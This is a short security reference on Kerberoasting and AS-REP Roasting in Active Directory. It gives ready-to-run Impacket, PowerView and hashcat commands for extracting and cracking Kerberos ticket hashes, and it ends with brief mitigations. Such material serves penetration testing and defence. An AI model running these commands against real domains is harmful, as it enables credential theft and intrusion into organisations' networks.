# Kerberoasting & AS-REP Roasting

### Kerberoasting (MITRE ATT&CK T1558.003)

Kerberoasting is a post-exploitation technique targeting service accounts in Active Directory. Any valid domain user can request a Kerberos Ticket Granting Service (TGS) ticket for any Service Principal Name (SPN) registered in the domain. 

Because the ticket is encrypted using the NTLM hash of the service account password, the ticket can be extracted from memory or network traffic and cracked offline without triggering account lockouts.

---

#### 1. Enumerating SPNs
Using Impacket from a Linux workstation:

```bash
GetUserSPNs.py domain.local/username:password -dc-ip 10.10.10.10 -request
```

Using PowerShell (PowerView):

```powershell
Get-DomainUser -SPN | Select-Object name, serviceprincipalname
```

---

#### 2. Offline Cracking with Hashcat

Once the Kerberos TGS hashes (`$krb5tgs$23$...`) are captured:

```bash
# Hashcat mode 13100 (Kerberos 5 TGS-REP etype 23)
hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

---

### AS-REP Roasting (MITRE ATT&CK T1558.004)

AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`). 

When pre-authentication is disabled, an attacker does not even need to authenticate to the domain—they can simply request an AS-REP ticket for any targeted account directly from the KDC.

```bash
# Extract AS-REP hashes without credentials
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt -dc-ip 10.10.10.10

# Crack with Hashcat mode 18200
hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

### Mitigations

* Enforce passwords longer than 25 characters for all service accounts (making offline cracking computationally infeasible).
* Use Group Managed Service Accounts (gMSA) with automated 120-character password rotation.
* Ensure pre-authentication is enforced on all user accounts.
